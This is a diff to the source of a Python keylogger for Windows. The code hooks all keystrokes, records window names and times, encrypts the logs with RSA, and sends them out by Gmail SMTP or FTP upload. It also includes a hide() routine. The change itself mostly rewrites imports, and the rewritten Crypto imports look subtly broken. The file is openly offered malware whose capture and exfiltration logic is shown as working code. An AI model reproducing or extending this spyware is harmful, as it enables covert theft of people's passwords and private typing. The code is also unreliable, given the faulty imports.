@@ -3,7 +3,7 @@
 
 import os
 import sys
-from threading import Thread, Event
+import threading
 import win32event
 import win32api
 import winerror
@@ -13,14 +13,14 @@ import ctypes
 import smtplib
 import ftplib
 import urllib
-from datetime import datetime, timedelta
-import keyboard         # see https://github.com/boppreh/keyboard.
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP
+import datetime
+import keyboard             # see https://github.com/boppreh/keyboard.
+import Crypto.PublicKey
+import Crypto.Cipher
 import base64
 
 # CONSTANTS
-CHAR_LIMIT = 1000           # this many characters one should type to make the logger log the line_buffer.
+CHAR_LIMIT = 1000         # this many characters one should type to make the logger log the line_buffer.
 MINUTES_TO_LOG_TIME = 5   # this many minutes should pass to log the current time.
 
 # - GLOBAL SCOPE VARIABLES start -
@@ -29,10 +29,10 @@ if len(sys.argv) == 1:
     sys.argv = [sys.argv[0], 'debug', 'encrypt']
 mode = sys.argv[1]
 encryption_on = True if 'encrypt' in sys.argv else False
-reverse_encryption = True  # use True to decrypt back to be able to debug without turning the encryption off
+reverse_encryption = False  # use True to decrypt back to be able to debug without turning the encryption off
 
 line_buffer, window_name = '', ''
-time_logged = datetime.now() - timedelta(minutes=MINUTES_TO_LOG_TIME)
+time_logged = datetime.datetime.now() - datetime.timedelta(minutes=MINUTES_TO_LOG_TIME)
 count, backspace_buffer_len = 0, 0
 
 pgp_public_key = """-----BEGIN PUBLIC KEY-----
@@ -256,8 +256,8 @@ def hide():
 def decrypt(encrypted_blob):
     # Debug only, don't decrypt in production. Decrypt on your own.
     global pgp_private_key
-    rsa_key = RSA.importKey(pgp_private_key)                       # your private key (only for debugging)
-    rsa_key = PKCS1_OAEP.new(rsa_key)
+    rsa_key = Crypto.PublicKey.RSA.importKey(pgp_private_key)                       # your private key (only for debugging)
+    rsa_key = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
     # Base 64 decode the data
     encrypted_blob = base64.b64decode(encrypted_blob)
     decrypted_msgstr = rsa_key.decrypt(encrypted_blob)
@@ -283,8 +283,8 @@ def decrypt_many(encrypted):
 def encrypt(message_to_encrypt):
     global pgp_public_key
     # Import the Public Key and use for encryption using PKCS1_OAEP
-    rsa_key = RSA.importKey(pgp_public_key)
-    rsa_key = PKCS1_OAEP.new(rsa_key)
+    rsa_key = Crypto.PublicKey.RSA.importKey(pgp_public_key)
+    rsa_key = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
     message_to_encrypt = bytes(message_to_encrypt, 'utf-8')
     # Use the public key for encryption
     encrypted = rsa_key.encrypt(message_to_encrypt)
@@ -297,7 +297,7 @@ def encrypt(message_to_encrypt):
 def log_local():
     # Local mode
     global full_path, line_buffer, backspace_buffer_len
-    todays_date = datetime.now().strftime('%Y-%b-%d')
+    todays_date = datetime.datetime.now().strftime('%Y-%b-%d')
     try:
         with open(full_path + "\\" + todays_date + ".txt", "a") as fp:
             fp.write(line_buffer)
@@ -323,16 +323,16 @@ def log_remote():
     return True
 
 
-class TimerClass(Thread):
+class TimerClass(threading.Thread):
     # Email mode
     def __init__(self):
-        Thread.__init__(self)
-        self.event = Event()
+        threading.Thread.__init__(self)
+        self.event = threading.Event()
 
     def run(self):
         while not self.event.is_set():
             global line_buffer, backspace_buffer_len
-            ts = datetime.now()
+            ts = datetime.datetime.now()
             SERVER = "smtp.gmail.com"  # Specify Server Here
             PORT = 587  # Specify Port Here
             USER = "your_email@gmail.com"  # Specify Username Here
@@ -364,7 +364,7 @@ Subject: %s
 def log_ftp():
     # FTP mode - Upload logs to FTP account
     global line_buffer, count, backspace_buffer_len
-    todays_date = datetime.now().strftime('%Y-%b-%d')
+    todays_date = datetime.datetime.now().strftime('%Y-%b-%d')
     count += 1
     FILENAME = todays_date + "-" + str(count) + ".txt"
     fp = open(FILENAME, "a")
@@ -448,8 +448,8 @@ def key_callback(event):
         window_name = event_window_name                                               # set the new value
 
     # 2. if MINUTES_TO_LOG_TIME minutes has passed - LOG THE TIME
-    now = datetime.now()
-    if now - time_logged > timedelta(minutes=MINUTES_TO_LOG_TIME):
+    now = datetime.datetime.now()
+    if now - time_logged > datetime.timedelta(minutes=MINUTES_TO_LOG_TIME):
         time_buffer = '\n[Time: ' + ('%02d:%02d' % (now.hour, now.minute)) + ']: '  # update the line_buffer
         time_logged = now                                                           # set the new value
 
@@ -532,5 +532,7 @@ def key_callback(event):
 on_press_hook_manager = keyboard.hook(key_callback)
 keyboard.wait()
 
-# test_string = """..."""
+test_string = """
+
+"""
 # print('decrypted log: ', decrypt_many(test_string))
